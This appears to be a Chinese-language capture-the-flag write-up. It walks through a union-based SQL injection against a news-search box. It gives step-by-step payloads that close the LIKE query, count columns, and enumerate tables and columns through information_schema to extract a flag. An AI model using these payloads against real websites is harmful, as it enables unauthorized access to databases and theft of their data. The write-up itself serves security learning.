Basic_SQL

  个人理解，SQL注入就是通过把能满足自己意愿的SQL命令插入到url或输入框中，提交给服务器，让数据库执行你的SQL语句，来得到你想要的数据，达到你想要的结果。经过广搜资料，了解到这道题需要的技术是SQL注入的一种：联合查询注入。

注入前分析

  点击给的链接，跳转转到的是一个新闻查询界面，有一个查询输入框，所谓的SQL注入应该是在这个输入框中进行了。经过多此尝试，发现下面显示的新闻是根据你输入的字符串得到的。输入a visual能够得到Create a visual language that... 这么一条新闻，输入a visual 啥都查询不到，因此可以确定，实现新闻查询的SQL语句采用了模糊查询，其模糊查询格式为%输入的字符串% ，其SQL语句可能是select 标题，内容 from 新闻表 where 内容 like '%输入的字符串%'。（在注入成功后，发现其SQL语句应该为select title,content from news where content like '%输入的字符串%'）

  在大概推测出SQL语句后，尝试在不影响查询的情况下（以此来判断是否执行了我在输入框中输入的内容），进行闭合SQL语句的前半部分和后半部分。经几次试验，发现输入hello%' ; --和hello%' ; ' 这两种方式都可以起到闭合SQL语句且不影响正常查询的作用。

  其对应的SQL语句为：
select title,content from news where content like '%hello%' ; --%'
--为SQL中的单行注释符，可以注释掉后面的语句，只执行”;”之前的语句。
select title,content from news where content like '%hello%' ; '%'

SQL注入

  通过上面的分析之后，可以进行SQL了，union联合查询，需要前后字段数量（列数）保持一致，否则就会报错，在分号”;”之前写SQL命令就可以。

  1. 首先要知道当前表有几列，经几次测试发现，在输入框中输入hello%' union select 1,2,3 ; -- 不再报错，那么当前表应该有3列，并且得到如下页面：
  2. 查询数据库的名称，使用database()函数实现，输入框中输入hello%' union select 1,2,database() ; --，得到数据库的名称：news。
  3. 查询当前数据库news中的表有哪些，为了便于查看，可以将”hello”替换成content无法匹配的字符串，输入框输入：
    hellowww%' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='news'); --
    ![](/images/BasicSQL/2.png)
可以知道，news数据库中有两个表，分别为f1agfl4gher3和news。news中存放新闻相关的内容，那么flag应该就在f1agfl4gher3表中了。
  4. 获取f1agfl4gher3表的列，输入框输入为：
    hellowww%' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema='news' and table_name='f1agfl4gher3'); --
    可以得知f1agfl4gher3表中有两列，列名为id和h3r31sfl4g。只要获取表中的内容，就可以取得flag了。
  5. 输入hellowww%' union select 1,2,(select h3r31sfl4g from f1agfl4gher3); -- 得到flag。

知识补充

  常用获取数据库信息的函数：

函数名称 作用
version() 获取MySQL版本号
user() 获取当前用户名
database() 返回数据库名
